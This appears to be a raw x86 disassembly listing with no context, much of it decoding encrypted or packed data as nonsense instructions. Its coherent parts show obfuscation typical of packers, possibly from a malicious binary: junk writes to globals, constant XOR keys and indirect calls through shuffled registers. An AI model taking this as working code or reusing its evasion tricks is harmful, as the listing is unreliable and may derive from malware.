  411879:	jmp    0x9f497c07
  41187e:	stc    
  41187f:	and    DWORD PTR [ecx-0x52],esp
  411882:	dec    ebp
  411883:	jmp    0xb61e:0x69ffdfd8
  41188a:	ss jb  0x4118bb
  41188d:	loopne 0x41181d
  41188f:	cmp    eax,0xfb615f2c
  411894:	xor    eax,0x1b180488
  411899:	int3   
  41189a:	jle    0x4118ec
  41189c:	int3   
  41189d:	cwde   
  41189e:	es add ch,cl
  4118a1:	and    esi,edx
  4118a3:	rcl    DWORD PTR [edx+0x69f51e2f],1
  4118a9:	dec    esi
  4118aa:	int3   
  4118ab:	dec    ebx
  4118ac:	cmp    al,0x71
  4118ae:	in     al,dx
  4118af:	iret   
  4118b0:	mov    dl,0xe
  4118b2:	mov    esi,0xa5a45029
  4118b7:	push   0xa4d7a6ba
  4118bc:	stos   DWORD PTR es:[edi],eax
  4118bd:	push   ss
  4118be:	cmp    eax,0x88067e83
  4118c3:	pop    ds
  4118c4:	les    ebx,FWORD PTR [esi+0x2a]
  4118c7:	test   ebp,ebp
  4118c9:	imul   eax,esp,0xffffff9d
  4118cc:	and    DWORD PTR [ecx-0x79],ebp
  4118cf:	inc    eax
  4118d0:	mov    al,BYTE PTR [ebx]
  4118d2:	pop    ss
  4118d3:	das    
  4118d4:	dec    edx
  4118d5:	mov    al,0x75
  4118d7:	scas   al,BYTE PTR es:[edi]
  4118d8:	mov    ebx,0x61065d99
  4118dd:	sti    
  4118de:	push   ds
  4118df:	adc    ecx,DWORD PTR [eax]
  4118e1:	ret    
  4118e2:	xchg   edi,eax
  4118e4:	cwde   
  4118e5:	cmp    edx,ebx
  4118e7:	pop    ds
  4118e8:	and    al,0x28
  4118ea:	xor    DWORD PTR [esi+0x36],ebx
  4118ed:	fs int 0x1f
  4118f0:	cmp    DWORD PTR [edx-0x3e2450a0],0x1c
  4118f7:	(bad)  
  4118f9:	sub    eax,0xeee8de62
  4118fe:	(bad)  
  4118ff:	out    0x46,eax
  411901:	mov    cl,0x7a
  411903:	add    ah,BYTE PTR [ecx-0xfa989e3]
  411909:	(bad)  
  41190a:	jbe    0x411960
  41190c:	test   DWORD PTR [ebx],eax
  41190e:	pusha  
  41190f:	(bad)  
  411910:	test   eax,0x642843a5
  411915:	xchg   BYTE PTR [ebp+edi*2+0x5],dh
  411919:	nop
  41191a:	(bad)  
  41191b:	(bad)  
  41191c:	loope  0x4118cb
  41191e:	pusha  
  41191f:	mov    eax,0xc4da6f65
  411924:	aam    0xc7
  411926:	scas   al,BYTE PTR es:[edi]
  411927:	test   al,0x75
  411929:	push   ds
  41192a:	xchg   ecx,eax
  41192b:	leave  
  41192c:	aam    0x7d
  41192e:	mov    WORD PTR [edx+edx*1],cs
  411931:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411932:	xchg   DWORD PTR [esi],eax
  411934:	and    DWORD PTR [eax-0x62],0xbb1fe983
  41193b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41193c:	cmp    al,al
  41193e:	sub    edi,edx
  411940:	and    esp,DWORD PTR [ebx-0x223d4598]
  411946:	ds es ret 
  411949:	or     eax,0xe981099a
  41194e:	ret    
  41194f:	push   ebx
  411950:	lahf   
  411951:	shr    BYTE PTR [eax+0x16],cl
  411954:	test   al,0x8
  411956:	ins    BYTE PTR es:[edi],dx
  411957:	loop   0x4118f1
  411959:	hlt    
  41195a:	(bad)  
  41195b:	adc    dh,cl
  41195d:	cmp    ebp,esi
  41195f:	pop    ecx
  411960:	sub    eax,DWORD PTR [esi]
  411962:	add    BYTE PTR [edx-0x20b70f26],dh
  411968:	ins    BYTE PTR es:[edi],dx
  411969:	sbb    BYTE PTR [edx+0x1a],bh
  41196c:	mov    cl,0xd6
  41196e:	inc    edi
  41196f:	cmp    al,0xb5
  411971:	arpl   WORD PTR [edx+0x6e],bp
  411974:	lods   eax,DWORD PTR ds:[esi]
  411975:	sbb    cl,ah
  411977:	and    BYTE PTR [edi+0x5adee9bf],al
  41197d:	test   DWORD PTR [edx-0xc],0x87744923
  411984:	or     dh,bh
  411986:	les    ebp,FWORD PTR [esi-0x7]
  411989:	jae    0x41192c
  41198b:	jp     0x41198e
  41198d:	cld    
  41198e:	outs   dx,DWORD PTR ds:[esi]
  41198f:	jnp    0x4119a7
  411991:	call   0x8017:0x2652d32
  411998:	lock jmp 0xa202:0x14a8b3ab
  4119a0:	clc    
  4119a1:	jmp    0xad542616
  4119a6:	test   DWORD PTR [ecx+esi*8+0x1d483138],edi
  4119ad:	jmp    DWORD PTR [esi+0x23e5b34]
  4119b3:	mov    ecx,0xe7efa9e2
  4119b8:	ja     0x411a36
  4119ba:	sbb    bl,BYTE PTR [edx-0x5b]
  4119bd:	mov    BYTE PTR [eax-0x17649e77],0xf9
  4119c4:	imul   BYTE PTR [esi+ecx*4]
  4119c7:	jo     0x411a03
  4119c9:	leave  
  4119ca:	into   
  4119cb:	push   cs
  4119cc:	cwde   
  4119cd:	adc    al,0x12
  4119cf:	jbe    0x4119e0
  4119d1:	cdq    
  4119d2:	call   0xd3a35b8a
  4119d7:	mov    eax,ds:0xbe636350
  4119dc:	inc    esp
  4119dd:	cmp    BYTE PTR [ecx+0x6ef4fc06],0xba
  4119e4:	call   FWORD PTR [ebp-0x51bd5ae2]
  4119ea:	inc    esp
  4119eb:	repnz ins DWORD PTR es:[edi],dx
  4119ed:	xchg   edi,eax
  4119ee:	sub    DWORD PTR [esi],0x71
  4119f1:	and    esp,edi
  4119f3:	cmp    ah,al
  4119f5:	sbb    dl,al
  4119f7:	or     ebx,DWORD PTR [ecx-0x22919391]
  4119fd:	out    dx,al
  4119fe:	jmp    0x8017:0x73c49c45
  411a05:	stos   BYTE PTR es:[edi],al
  411a06:	into   
  411a07:	(bad)  [esi-0x6535a3bf]
  411a0d:	out    dx,al
  411a0e:	cwde   
  411a0f:	sub    ah,dh
  411a11:	or     ch,dh
  411a13:	lods   al,BYTE PTR ds:[esi]
  411a14:	outs   dx,BYTE PTR ds:[esi]
  411a15:	mov    ds:0x776e553,eax
  411a1a:	jmp    0x411a03
  411a1c:	sub    DWORD PTR [esi-0x41],esi
  411a1f:	add    eax,0x4aaf3166
  411a24:	xor    ecx,esi
  411a26:	add    ecx,edi
  411a28:	xor    edx,edx
  411a2a:	div    ecx
  411a2c:	mov    ecx,DWORD PTR [ebp-0x4]
  411a2f:	xor    ecx,esi
  411a31:	lea    eax,[ecx+eax*1+0x3272f6]
  411a38:	mov    ecx,DWORD PTR [ebp+0x8]
  411a3b:	mov    edx,DWORD PTR [ebp-0x20]
  411a3e:	mov    DWORD PTR [edx+ecx*4],eax
  411a41:	mov    eax,DWORD PTR [ebp-0xc]
  411a44:	mov    ecx,DWORD PTR [ebp+0x8]
  411a47:	xor    eax,esi
  411a49:	lea    eax,[eax+ecx*1+0x3272f6]
  411a50:	mov    DWORD PTR [ebp+0x8],eax
  411a53:	mov    eax,DWORD PTR [ebp-0xc]
  411a56:	mov    ecx,DWORD PTR [ebp+0x14]
  411a59:	xor    eax,esi
  411a5b:	add    eax,edi
  411a5d:	imul   eax,DWORD PTR [ecx]
  411a60:	mov    ecx,DWORD PTR [ebp-0x4]
  411a63:	mov    edx,DWORD PTR [ebp+0x8]
  411a66:	xor    ecx,esi
  411a68:	lea    ecx,[ecx+edx*1+0x3272f6]
  411a6f:	cmp    ecx,eax
  411a71:	jne    0x40f668
  411a77:	mov    eax,DWORD PTR [ebp-0x4]
  411a7a:	xor    eax,esi
  411a7c:	add    eax,edi
  411a7e:	mov    DWORD PTR [ebp-0x10],eax
  411a81:	mov    ebx,0x65655
  411a86:	add    ebx,0x3234
  411a8c:	xchg   ebx,esi
  411a8e:	xor    ebx,ebx
  411a90:	push   esi
  411a91:	mov    esi,ebx
  411a93:	pop    ebx
  411a94:	mov    edx,esi
  411a96:	add    ebx,0x1002
  411a9c:	lea    eax,[ebp-0x18]
  411a9f:	add    edx,eax
  411aa1:	add    edx,0x5
  411aa4:	push   edx
  411aa5:	inc    esi
  411aa6:	pop    ecx
  411aa7:	dec    ecx
  411aa8:	xchg   ecx,eax
  411aa9:	dec    eax
  411aaa:	xchg   ecx,eax
  411aab:	dec    ecx
  411aac:	xchg   ecx,edx
  411aae:	dec    edx
  411aaf:	push   edx
  411ab0:	mov    edx,ebx
  411ab2:	pop    ebx
  411ab3:	dec    ebx
  411ab4:	call   DWORD PTR [ebx]
  411ab6:	cmp    DWORD PTR [ebp+0x10],esi
  411ab9:	je     0x411ada
  411abf:	xchg   edx,eax
  411ac0:	push   0xc
  411ac2:	pop    ecx
  411ac3:	dec    ecx
  411ac4:	push   0x3
  411ac6:	pop    ebx
  411ac7:	inc    ebx
  411ac8:	xchg   ebx,ecx
  411aca:	inc    ecx
  411acb:	sub    ebx,ecx
  411acd:	xchg   ebx,ecx
  411acf:	dec    ecx
  411ad0:	dec    ecx
  411ad1:	mov    eax,DWORD PTR [ebp-0x1c]
  411ad4:	imul   eax,ecx
  411ad7:	add    esp,eax
  411ad9:	xchg   edx,eax
  411ada:	push   eax
  411adb:	xor    ebx,ebx
  411add:	mov    edx,esp
  411adf:	dec    edx
  411ae0:	inc    ebx
  411ae1:	add    ebx,DWORD PTR [edx+ebx*1]
  411ae4:	dec    ebx
  411ae5:	xor    edx,edx
  411ae7:	add    DWORD PTR [ebp-0x10],ebx
  411aea:	pop    ebx
  411aeb:	mov    eax,DWORD PTR [ebp-0x10]
  411aee:	pop    edi
  411aef:	pop    esi
  411af0:	pop    ebx
  411af1:	leave  
  411af2:	ret    0x10
  411af5:	push   ebp
  411af6:	mov    ebp,esp
  411af8:	push   ecx
  411af9:	mov    DWORD PTR [ebp-0x4],0xf89c85a1
  411b00:	mov    eax,DWORD PTR [ebp-0x4]
  411b03:	sbb    DWORD PTR ds:0x428ea7,ebx
  411b09:	mov    edx,DWORD PTR [ebp+0x10]
  411b0c:	mov    ecx,0x75108af
  411b11:	sbb    DWORD PTR ds:0x428eaf,0x428e4b
  411b1b:	xor    eax,ecx
  411b1d:	or     DWORD PTR ds:0x428e77,0x428e2b
  411b27:	add    eax,0x3272f6
  411b2c:	and    DWORD PTR ds:0x428e77,0x1e6e
  411b36:	mov    DWORD PTR [edx],eax
  411b38:	mov    eax,DWORD PTR [ebp+0xc]
  411b3b:	xor    eax,ecx
  411b3d:	or     DWORD PTR ds:0x428eab,0x179
  411b47:	push   esi
  411b48:	mov    esi,DWORD PTR [ebp+0x10]
  411b4b:	mov    edx,DWORD PTR ds:0x428ea7
  411b51:	sbb    DWORD PTR ds:0x428eaf,edx
  411b57:	mov    edx,0x3272f6
  411b5c:	xor    DWORD PTR ds:0x428eab,0x428e83
  411b66:	add    eax,edx
  411b68:	or     DWORD PTR ds:0x428e83,0x428e6f
  411b72:	mov    DWORD PTR [esi+0x4],eax
  411b75:	mov    eax,DWORD PTR [ebp+0x14]
  411b78:	movzx  esi,WORD PTR ds:0x428ecf
  411b7f:	sub    DWORD PTR ds:0x428e9b,esi
  411b85:	mov    esi,DWORD PTR [ebp+0x10]
  411b88:	adc    DWORD PTR ds:0x428e5b,0xf72
  411b92:	mov    DWORD PTR [esi+0x8],eax
  411b95:	mov    eax,DWORD PTR [ebp+0x18]
  411b98:	mov    esi,DWORD PTR [ebp+0x10]
  411b9b:	mov    DWORD PTR [esi+0xc],eax
  411b9e:	mov    eax,DWORD PTR [ebp+0x1c]
  411ba1:	mov    esi,DWORD PTR [ebp+0x10]
  411ba4:	mov    DWORD PTR [esi+0x10],eax
  411ba7:	mov    eax,DWORD PTR [ebp+0x8]
  411baa:	xor    eax,ecx
  411bac:	add    eax,edx
  411bae:	pop    esi
  411baf:	leave  
  411bb0:	ret    0x18
  411bb3:	push   ebp
  411bb4:	mov    ebp,esp
  411bb6:	sub    esp,0x9c
  411bbc:	sbb    ecx,0x4d1
  411bc2:	mov    ecx,DWORD PTR [ebp+0x8]
  411bc5:	mov    eax,0x8a9b
  411bca:	xor    ax,WORD PTR [ecx+0x20]
  411bce:	mov    ecx,DWORD PTR ds:0x428ea7
  411bd4:	adc    DWORD PTR ds:0x428e9f,ecx
  411bda:	mov    ecx,0x3b5d
  411bdf:	sub    DWORD PTR ds:0x428eab,0x1476
  411be9:	add    ax,cx
  411bec:	movzx  eax,ax
  411bef:	mov    DWORD PTR ds:0x428e8b,0x1b
  411bf9:	cmp    DWORD PTR ds:0x428e8b,0x0
  411c00:	je     0x411c4c
  411c06:	cmp    DWORD PTR ds:0x428e8b,0x2
  411c0d:	ja     0x411c4c
  411c13:	jmp    0x411c20
  411c18:	push   0x4
  411c1a:	call   DWORD PTR ds:0x42aa1b
  411c20:	cmp    DWORD PTR ds:0x428e8b,0x3
  411c27:	jne    0x411c3a
  411c2d:	mov    ecx,DWORD PTR ds:0x428e8b
  411c33:	dec    ecx
  411c34:	mov    DWORD PTR ds:0x428e8b,ecx
  411c3a:	mov    ecx,DWORD PTR ds:0x428e8b
  411c40:	dec    ecx
  411c41:	mov    DWORD PTR ds:0x428e8b,ecx
  411c47:	jmp    0x411bf9
  411c4c:	mov    DWORD PTR [ebp-0x10],eax
  411c4f:	mov    BYTE PTR [ebp-0x1],0x82
  411c53:	lea    eax,[ebp-0x1]
  411c56:	or     DWORD PTR ds:0x428e33,0x2387
  411c60:	mov    DWORD PTR [ebp-0xc],eax
  411c63:	xor    DWORD PTR ds:0x428e7f,edi
  411c69:	mov    al,BYTE PTR [ebp-0x1]
  411c6c:	mov    ecx,DWORD PTR [ebp-0xc]
  411c6f:	sbb    DWORD PTR ds:0x428ebf,0x63b1
  411c79:	xor    al,0x7f
  411c7b:	sbb    DWORD PTR ds:0x428e43,0x428e93
  411c85:	add    al,0x4
  411c87:	adc    DWORD PTR ds:0x428e5b,0xd9d
  411c91:	mov    BYTE PTR [ecx],al
  411c93:	and    eax,DWORD PTR ds:0x428eaf
  411c99:	mov    DWORD PTR [ebp-0x18],0xf89c85a5
  411ca0:	push   ebx
  411ca1:	mov    ecx,DWORD PTR ds:0x428e57
  411ca7:	add    DWORD PTR ds:0x428e6f,ecx
  411cad:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  411cb4:	not    eax
  411cb6:	mov    ecx,DWORD PTR [ebp-0x18]
  411cb9:	mov    DWORD PTR ds:0x428ebf,0x1e
  411cc3:	cmp    DWORD PTR ds:0x428ebf,0x0
  411cca:	je     0x4140d3
  411cd0:	cmp    DWORD PTR ds:0x428ebf,0x3
  411cd7:	jg     0x4140d3
  411cdd:	jmp    0x411cf2
  411ce2:	push   0x428e97
  411ce7:	push   0x1953
  411cec:	call   DWORD PTR ds:0x42aa1f
  411cf2:	cmp    DWORD PTR ds:0x428ebf,0x4
  411cf9:	jne    0x411d0a
  411cff:	mov    eax,ds:0x428ebf
  411d04:	dec    eax
  411d05:	mov    ds:0x428ebf,eax
  411d0a:	mov    eax,ds:0x428ebf
  411d0f:	dec    eax
  411d10:	mov    ds:0x428ebf,eax
  411d15:	jmp    0x411cc3
  411d1a:	jmp    0x4140d3
  411d1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d20:	test   al,0xbe
  411d22:	cdq    
  411d23:	mov    esp,0x1c848485
  411d28:	pcmpgtw mm0,QWORD PTR [eax+0x3b69fd9f]
  411d2f:	xor    DWORD PTR [ebx+0x60e78383],ecx
  411d35:	add    DWORD PTR [ebx-0xb78585c],0xffffffad
  411d3c:	mov    ch,0x85
  411d3e:	sub    eax,0x23e1dc6f
  411d43:	lock dec ecx
  411d45:	imul   edi,DWORD PTR [ebx+edi*1+0x24],0x207badff
  411d4d:	popa   
  411d4e:	lds    edi,FWORD PTR [edi]
  411d50:	loopne 0x411d34
  411d52:	push   edi
  411d53:	sub    BYTE PTR [edi],bl
  411d55:	sbb    DWORD PTR [ebp+0x27ffc0cc],ebp
  411d5b:	cmp    BYTE PTR [ecx+ebp*8-0x62],dh
  411d5f:	xor    cl,ch
  411d61:	and    edx,edx
  411d63:	mov    ch,0xe6
  411d65:	arpl   bp,sp
  411d67:	cli    
  411d68:	sub    al,0x3d
  411d6a:	xrelease xchg DWORD PTR [edx-0x1613ed8a],ecx
  411d71:	mov    ecx,0x86ccdde8
  411d76:	into   
  411d77:	xchg   edx,eax
  411d78:	fs sbb eax,0x77ac924d
  411d7e:	stc    
  411d7f:	xchg   esi,eax
  411d80:	int    0x4b
  411d82:	jle    0x411d55
  411d84:	sbb    ebx,DWORD PTR [esi]
  411d86:	xchg   ebp,eax
  411d87:	mov    WORD PTR [edi-0x146f6173],es
  411d8d:	lea    edi,[ecx+0x74e2603e]
  411d93:	and    DWORD PTR [esi+0x1b],edi
  411d96:	xor    al,0xf
  411d98:	inc    esi
  411d99:	jmp    0xdce5bb7c
  411d9e:	xchg   ebx,eax
  411d9f:	repnz fsubr QWORD PTR ds:0xfd17e186
  411da6:	out    0x86,eax
  411da8:	cld    
  411da9:	fld    QWORD PTR [edi]
  411dab:	rol    DWORD PTR [edi-0x78e73523],cl
  411db1:	inc    edi
  411db2:	cli    
  411db3:	daa    
  411db4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411db5:	sub    ah,BYTE PTR [edx-0x765ace8a]
  411dbb:	mov    ch,0x93
  411dbd:	xchg   esi,eax
  411dbe:	xor    ecx,DWORD PTR [edx-0x22]
  411dc1:	popa   
  411dc2:	push   ebp
  411dc3:	cwde   
  411dc4:	cld    
  411dc5:	mov    dl,0x39
  411dc7:	(bad)  
  411dc8:	sti    
  411dc9:	cmp    eax,DWORD PTR [eax]
  411dcb:	cmp    BYTE PTR [ecx],bh
  411dcd:	sbb    esp,esp
  411dcf:	and    DWORD PTR [ecx],ebp
  411dd1:	das    
  411dd2:	test   BYTE PTR [ecx-0x69],bh
  411dd5:	mov    cl,BYTE PTR ds:0x61a3c4bf
  411ddb:	cmp    esp,DWORD PTR [ebp-0x87f47d7]
  411de1:	icebp  
  411de2:	sub    eax,0xdd002023
  411de7:	hlt    
  411de8:	jle    0x411e23
  411dea:	dec    DWORD PTR [esi+edi*1+0x67d51163]
  411df1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411df2:	enter  0x7199,0xdf
  411df6:	mov    WORD PTR [ebp+ebp*1+0x61],gs
  411dfa:	lahf   
  411dfb:	(bad)  [edi]
  411dfd:	push   es
  411dfe:	add    eax,0xcdfba298
  411e03:	mov    ds:0xbb9e8028,al
  411e08:	inc    edx
  411e09:	mov    bl,0x72
  411e0b:	jbe    0x411e0e
  411e0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e0e:	stc    
  411e0f:	(bad)  [edx+0x28f486b3]
  411e15:	sti    
  411e16:	out    0x60,al
  411e18:	stos   DWORD PTR es:[edi],eax
  411e19:	pusha  
  411e1a:	test   al,0xc3
  411e1c:	push   ds
  411e1d:	adc    eax,0xa5b65730
  411e22:	cli    
  411e23:	loope  0x411e62
  411e25:	sub    ah,dh
  411e27:	stc    
  411e28:	sbb    bh,dl
  411e2a:	frstor [edi]
  411e2c:	stos   DWORD PTR es:[edi],eax
  411e2d:	aas    
  411e2e:	in     eax,0xee
  411e30:	push   edi
  411e31:	fmul   QWORD PTR ds:0x366b3e1f
  411e37:	cli    
  411e38:	xchg   ecx,eax
  411e39:	mov    esp,0x380fd72b
  411e3e:	stc    
  411e3f:	xchg   esp,eax
  411e40:	stos   DWORD PTR es:[edi],eax
  411e41:	jns    0x411dfd
  411e43:	inc    ebx
  411e44:	cli    
  411e45:	rcr    DWORD PTR [ebp-0x4c],0x46
  411e49:	and    cl,BYTE PTR [edx-0x36]
  411e4c:	shr    BYTE PTR [ecx+ecx*1],0x87
  411e50:	jle    0x411ec5
  411e52:	pop    esi
  411e53:	push   esp
  411e54:	gs pop eax
  411e56:	iret   
  411e57:	daa    
  411e58:	pop    ecx
  411e59:	xchg   ecx,eax
  411e5a:	cmp    al,0x87
  411e5c:	(bad)  
  411e5d:	std    
  411e5e:	lods   eax,DWORD PTR ds:[esi]
  411e5f:	ffree  st(6)
  411e61:	mov    edx,cs
  411e63:	stos   DWORD PTR es:[edi],eax
  411e64:	sub    DWORD PTR [edx+0x428b4834],esp
  411e6a:	adc    BYTE PTR [ebx-0x71],dh
  411e6d:	mov    edi,0xe8fa8d4d
  411e72:	popf   
  411e73:	enter  0xaa4b,0x90
  411e77:	mov    al,BYTE PTR [ebx+0x4]
  411e7a:	push   esp
  411e7b:	dec    edi
  411e7c:	popa   
  411e7d:	push   es
  411e7e:	mov    WORD PTR [esi-0x2de2c7b4],ss
  411e84:	(bad)  
  411e85:	js     0x411e83
  411e87:	mov    ah,0x19
  411e89:	dec    eax
  411e8a:	pop    edi
  411e8b:	data16 ja 0x411ee7
  411e8e:	inc    ecx
  411e8f:	pop    eax
  411e90:	dec    ebp
  411e91:	mov    ch,0x20
  411e93:	pushf  
  411e94:	dec    esi
  411e95:	fiadd  DWORD PTR [edx]
  411e97:	hlt    
  411e98:	ins    BYTE PTR es:[edi],dx
  411e99:	bt     DWORD PTR [edi+0x566fdc9b],0x9f
  411ea1:	add    esp,0x1b
  411ea4:	inc    esp
  411ea5:	dec    edi
  411ea6:	jne    0x411eaf
  411ea8:	fwait
  411ea9:	std    
  411eaa:	mov    edi,0x657ac003
  411eaf:	loop   0x411f05
  411eb1:	jmp    0x72ec4e80
  411eb6:	loope  0x411e48
  411eb8:	push   ds
  411eb9:	neg    BYTE PTR [ecx]
  411ebb:	mov    cl,0xc2
  411ebd:	or     eax,0xf79a459e
  411ec2:	push   ds
  411ec3:	out    0xdf,al
  411ec5:	adc    bl,ah
  411ec7:	mov    ecx,0x263fd6a2
  411ecc:	mov    eax,ds:0x3642f232
  411ed1:	xor    BYTE PTR [edx+ebx*4-0x14],dl
  411ed5:	adc    al,BYTE PTR [ecx+ebx*8+0x59858c4d]
  411edc:	rcl    BYTE PTR [edx+0x7a5cc215],cl
  411ee2:	or     BYTE PTR [ebx-0x27644481],dh
  411ee8:	mov    cl,ah
  411eea:	cmp    DWORD PTR [ebx-0x1d],eax
  411eed:	imul   edx,DWORD PTR [eax-0x1cea1723],0xffffff8a
  411ef4:	xor    al,dl
  411ef6:	cmp    esp,ebp
  411ef8:	add    DWORD PTR [edx],edi
  411efa:	pop    ss
  411efb:	pop    edx
  411efc:	ret    
  411efd:	jle    0x411e86
  411eff:	inc    esi
  411f00:	mov    ah,0xb3
  411f02:	or     dh,BYTE PTR [edi]
  411f04:	fld    DWORD PTR [edx]
  411f06:	pop    edx
  411f07:	arpl   di,sp
  411f09:	les    ebx,FWORD PTR [eax-0x22]
  411f0c:	dec    eax
  411f0d:	push   ds
  411f0e:	and    al,cl
  411f10:	cmp    ebx,DWORD PTR [ecx-0x72]
  411f13:	or     al,0xab
  411f15:	outs   dx,BYTE PTR ds:[esi]
  411f16:	and    al,0xa1
  411f18:	sub    cl,BYTE PTR [ebx+0x42082132]
  411f1e:	pop    ds
  411f1f:	or     DWORD PTR [esi+0x2093e0a3],ecx
  411f25:	jae    0x411ee7
  411f27:	push   0xffffffbe
  411f29:	mov    esp,0x3d9e1718
  411f2e:	pop    ss
  411f2f:	test   BYTE PTR [edi],bh
  411f31:	mov    ebx,0x34c94a85
  411f36:	mov    gs,WORD PTR ds:0x8963efc2
  411f3c:	jo     0x411f87
  411f3e:	aaa    
  411f3f:	adc    al,0xdb
  411f41:	jmp    0x411f31
  411f43:	and    ch,BYTE PTR [ebx+0x5013a96f]
  411f49:	enter  0x1d9a,0x4
  411f4d:	mov    ds:0x7ebd4b97,al
  411f52:	ds push esi
  411f54:	sub    bl,BYTE PTR [edi-0x61]
  411f57:	mov    eax,0x4a2ab550
  411f5c:	and    DWORD PTR [edx+0x2ea0537a],ebx
  411f62:	loopne 0x411f53
  411f64:	pop    eax
  411f65:	pop    esp
  411f66:	retf   
  411f67:	cwde   
  411f68:	add    al,0xa9
  411f6a:	rcr    cl,1
  411f6c:	arpl   si,bp
  411f6e:	ror    edx,cl
  411f70:	punpckhbw mm6,QWORD PTR [edx]
  411f73:	stos   BYTE PTR es:[edi],al
  411f74:	nop
  411f75:	(bad)  
  411f76:	and    BYTE PTR [edx-0x193d7fca],ch
  411f7c:	push   0x101fa196
  411f81:	(bad)  
  411f82:	cld    
  411f83:	jmp    0x7308:0x9565b8e9
  411f8a:	push   edx
  411f8b:	pop    eax
  411f8c:	jmp    DWORD PTR [ecx+ebp*2]
  411f8f:	adc    dh,ah
  411f91:	add    DWORD PTR ds:0x2a71ad27,ebx
  411f97:	scas   eax,DWORD PTR es:[edi]
  411f98:	push   0x595e556d
  411f9d:	or     DWORD PTR [esi+0x4e],ecx
  411fa0:	xor    ecx,ebx
  411fa2:	mov    dh,0xba
  411fa4:	outs   dx,DWORD PTR ds:[esi]
  411fa5:	xchg   ecx,eax
  411fa6:	inc    esi
  411fa7:	dec    ebx
  411fa8:	test   BYTE PTR [eax],dl
  411faa:	and    ch,BYTE PTR [esp+ecx*2]
  411fad:	daa    
  411fae:	pop    es
  411faf:	fstp   st(7)
  411fb1:	mov    bh,0xcf
  411fb3:	mov    WORD PTR ds:0xacb13128,cs
  411fb9:	cs test esi,esp
  411fbc:	loope  0x411fbd
  411fbe:	jnp    0x411f76
  411fc0:	repnz mov edx,0xe607e8c9
  411fc6:	sbb    al,0x75
  411fc8:	ret    
  411fc9:	imul   ebx,DWORD PTR [esi+0x2d6707a],0x56ac7a4d
  411fd3:	scas   al,BYTE PTR es:[edi]
  411fd4:	ror    BYTE PTR [esi],0xbf
  411fd7:	xor    eax,0x1daad63d
  411fdc:	and    eax,DWORD PTR ds:0x4760120e
  411fe2:	and    eax,0x18dfb6c4
  411fe7:	or     DWORD PTR [ebx],edi
  411fe9:	xor    BYTE PTR [esi],ah
  411feb:	push   esi
  411fec:	mov    al,ds:0xc64eb8eb
  411ff1:	or     DWORD PTR [edi+0x28d2c141],ebx
  411ff7:	push   0x7c5c81a8
  411ffc:	xchg   edi,edx
  411ffe:	xchg   DWORD PTR [esi-0x19e8aef5],edi
  412004:	mul    ch
  412006:	mov    edx,0x7deedf69
  41200b:	mov    edx,0xb07a85ea
  412010:	xchg   esp,eax
  412011:	mov    bh,0x8a
  412013:	cmp    cl,BYTE PTR [edi-0x9]
  412016:	adc    DWORD PTR [ecx+0x192f6ae1],eax
  41201c:	ins    DWORD PTR es:[edi],dx
  41201d:	add    eax,DWORD PTR [edx+eax*8-0x2b]
  412021:	jmp    0x41204f
  412023:	mov    edx,0xe0117b66
  412028:	sub    BYTE PTR ss:[eax+ebp*2],ch
  41202c:	lds    esp,FWORD PTR [ebx+0x60]
  41202f:	and    DWORD PTR [edx-0x3d],ebp
  412032:	fst    QWORD PTR [ebp+0x25]
  412035:	mov    bh,0x46
  412037:	xchg   esp,eax
  412038:	add    ecx,DWORD PTR [esi+0x7ec5fd07]
  41203e:	xchg   esi,eax
  41203f:	sti    
  412040:	jecxz  0x412084
  412042:	push   ebp
  412043:	jns    0x411fca
  412045:	xchg   edi,eax
  412046:	mov    ch,0x7d
  412048:	push   ebx
  412049:	ret    
  41204a:	pusha  
  41204b:	mov    bl,0xd8
  41204d:	cmp    ecx,DWORD PTR [ecx-0x80]
  412050:	sub    edi,eax
  412052:	xor    al,0x76
  412054:	jge    0x412062
  412056:	adc    DWORD PTR [ebx],eax
  412058:	dec    esp
  412059:	int    0xf7
  41205b:	mov    ah,0x3
  41205d:	enter  0x3933,0x4f
  412061:	xchg   BYTE PTR [edi+0x3b],al
  412064:	xor    esi,edi
  412066:	jmp    0x3654:0xf919f174
  41206d:	add    ecx,eax
  41206f:	mov    ebx,0x48f7bd72
  412074:	cmp    al,0x7f
  412076:	and    al,0x5b
  412078:	ja     0x41205f
  41207a:	gs mov ebp,0xdea06c50
  412080:	clc    
  412081:	jb     0x412018
  412083:	and    dh,ah
  412085:	shl    BYTE PTR [ebp+0x3d],cl
  412088:	xor    ecx,eax
  41208a:	push   esp
  41208b:	test   edi,edi
  41208d:	sub    BYTE PTR gs:[ecx+eax*1],cl
  412091:	ja     0x41207d
  412093:	in     al,dx
  412094:	adc    DWORD PTR [edi-0x54],esi
  412097:	push   ebp
  412098:	fcmovu st,st(3)
  41209a:	cmp    al,0xab
  41209c:	cmp    eax,0xfdcbe273
  4120a1:	mov    eax,0xffcd2347
  4120a6:	inc    esi
  4120a7:	mov    eax,ds:0x7e93326b
  4120ac:	or     al,0xe
  4120ae:	jp     0x412033
  4120b0:	retf   
  4120b1:	out    0xd0,eax
  4120b3:	xor    bh,dl
  4120b5:	or     DWORD PTR [ebp+0x2a45083c],0x46
  4120bc:	push   esi
  4120bd:	pop    edi
  4120be:	sbb    esp,DWORD PTR [esi-0x63]
  4120c1:	mov    edi,0x64740087
  4120c6:	loop   0x4120d1
  4120c8:	ins    DWORD PTR es:[edi],dx
  4120c9:	cdq    
  4120ca:	pop    esi
  4120cb:	push   esp
  4120cc:	lea    edi,[ecx]
  4120ce:	stc    
  4120cf:	add    bh,BYTE PTR [ecx]
  4120d1:	pop    ecx
  4120d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120d3:	and    eax,0x19d3e25d
  4120d8:	in     eax,0xd2
  4120da:	cdq    
  4120db:	arpl   WORD PTR [ebp+0x10862f05],dx
  4120e1:	les    eax,FWORD PTR [ebp+0x42]
  4120e4:	add    edi,ecx
  4120e6:	mov    ah,BYTE PTR [edx+0x2f]
  4120e9:	sbb    cl,dh
  4120eb:	rcl    DWORD PTR [ecx],cl
  4120ed:	jmp    FWORD PTR [edx]
  4120ef:	sub    ah,BYTE PTR [ebx-0x133045c7]
  4120f5:	aad    0x1
  4120f7:	ja     0x41208a
  4120f9:	push   es
  4120fa:	or     eax,0xf65640c0
  4120ff:	ret    
